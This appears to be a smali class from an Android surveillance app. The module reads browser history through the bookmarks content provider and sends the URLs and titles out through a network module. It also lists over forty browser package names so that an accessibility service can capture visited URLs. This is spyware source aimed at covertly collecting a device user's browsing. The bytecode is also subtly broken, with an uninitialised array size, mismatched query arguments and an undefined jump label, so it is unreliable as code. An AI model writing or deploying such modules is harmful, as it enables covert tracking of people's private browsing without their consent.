.class public Lcom/smilex/enhanced/modules/BrowserHistoryModule;
.super Ljava/lang/Object;
.source "BrowserHistoryModule.java"

# ─────────────────────────────────────────────────────────────
# Reads browser history from all major Android browsers.
# Ported from hwapp391 hw/utils/o.java + Browser.BOOKMARKS_URI
# Supports 35+ browser packages.
# ─────────────────────────────────────────────────────────────

.field private static mContext:Landroid/content/Context;

.method public static init(Landroid/content/Context;)V
    .registers 2
    sput-object p0, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->mContext:Landroid/content/Context;
    return-void
.end method

# ─────────────────────────────────────────────────────────────
# Read browser history via content provider
# Tries Browser.BOOKMARKS_URI and fallback to file-based extraction
# ─────────────────────────────────────────────────────────────
.method public static syncBrowserHistory()V
    .registers 10
    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->mContext:Landroid/content/Context;
    if-eqz v0, :return_void

    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Browser History Sync:\n"
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    # Try Browser.BOOKMARKS_URI (works on older Android)
    sget-object v1, Lcom/smilex/enhanced/modules/BrowserHistoryModule;->mContext:Landroid/content/Context;
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object v1

    sget-object v2, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;

    new-array v3, v3, [Ljava/lang/String;
    const-string v4, "_id"
    const/4 v5, 0x0
    aput-object v4, v3, v5
    const-string v4, "url"
    const/4 v5, 0x1
    aput-object v4, v3, v5
    const-string v4, "title"
    const/4 v5, 0x2
    aput-object v4, v3, v5
    const-string v4, "date"
    const/4 v5, 0x3
    aput-object v4, v3, v5
    const-string v4, "visits"
    const/4 v5, 0x4
    aput-object v4, v3, v5
    const-string v4, "last_visit"
    const/4 v5, 0x5
    aput-object v4, v3, v5

    sget-object v4, Landroid/provider/Browser;->BOOKMARKS_URI:Landroid/net/Uri;
    invoke-virtual {v1, v4, v2, v3, v4}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    move-result-object v1

    if-eqz v1, :no_cursor
    :loop
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z
    move-result v2
    if-eqz v2, :close_cursor

    const/4 v2, 0x1
    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v2
    if-eqz v2, :loop

    const/4 v3, 0x2
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
    move-result-object v3

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, " | "
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    if-eqz v3, :no_title
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop
    :no_title
    const-string v2, "(no title)"
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "\n"
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :loop

    :close_cursor
    invoke-interface {v1}, Landroid/database/Cursor;->close()V
    goto :send

    :no_cursor
    const-string v1, "  (no browser history accessible via content provider)\n"
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :send
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    const-string v2, "browser_history"
    invoke-static {v2, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    goto :return_void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    :return_void
    return-void
.end method

# ─────────────────────────────────────────────────────────────
# Check if a package is a known browser (for URL capture in
# AccessibilityMonitorService TYPE_VIEW_CLICKED events)
# Covers ALL browser packages found in hwapp391
# ─────────────────────────────────────────────────────────────
.method public static isBrowserPackage(Ljava/lang/String;)Z
    .registers 3
    if-eqz p0, :return_false

    # Google Chrome family
    const-string v0, "com.android.chrome"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.chrome.beta"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Firefox / Gecko-based
    const-string v0, "org.mozilla.firefox"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Samsung Internet
    const-string v0, "com.sec.android.app.sbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.sec.android.app.sbrowser.beta"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Opera family
    const-string v0, "com.opera.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.opera.browser.afin"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.opera.mini.native"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Brave
    const-string v0, "com.brave.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Edge
    const-string v0, "com.microsoft.emmx"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # DuckDuckGo
    const-string v0, "com.duckduckgo.mobile.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Kiwi
    const-string v0, "com.kiwibrowser.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # MIUI / Xiaomi
    const-string v0, "com.miui.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.mi.globalbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.mi.globalbrowser.mini"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Huawei
    const-string v0, "com.huawei.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Vivo
    const-string v0, "com.vivo.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # OPPO / ColorOS / HeyTap
    const-string v0, "com.coloros.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.heytap.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Other Chinese browsers
    const-string v0, "com.nearme.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.ninesky.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.quark.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.ume.browser.cust"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Yandex
    const-string v0, "com.yandex.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.yandex.browser.lite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Sony
    const-string v0, "com.sonymobile.smallbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # HTC
    const-string v0, "com.htc.sense.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Asus
    const-string v0, "com.asus.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.asus.browsergenie"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # TCL
    const-string v0, "com.tcl.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Cyanogen
    const-string v0, "com.cyngn.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Android Bull Incognito
    const-string v0, "com.androidbull.incognito.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Ad Blocker browsers
    const-string v0, "com.hsv.freeadblockerbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "org.adblockplus.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Privacy browsers
    const-string v0, "org.torproject.torbrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "org.cromite.cromite"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Niche browsers
    const-string v0, "com.talpa.hibrowser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.pawxy.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "site.mises.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "com.getpure.pure"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "pure.lite.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "fast.secure.light.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    const-string v0, "proxy.browser.unblock.sites.proxybrowser.unblocksites"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Legacy Android browser
    const-string v0, "com.android.browser"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    # Yandex search plugin (acts as browser)
    const-string v0, "ru.yandex.searchplugin"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :b1

    :return_true
    const/4 v0, 0x1
    return v0

    :return_false
    const/4 v0, 0x0
    return v0
.end method
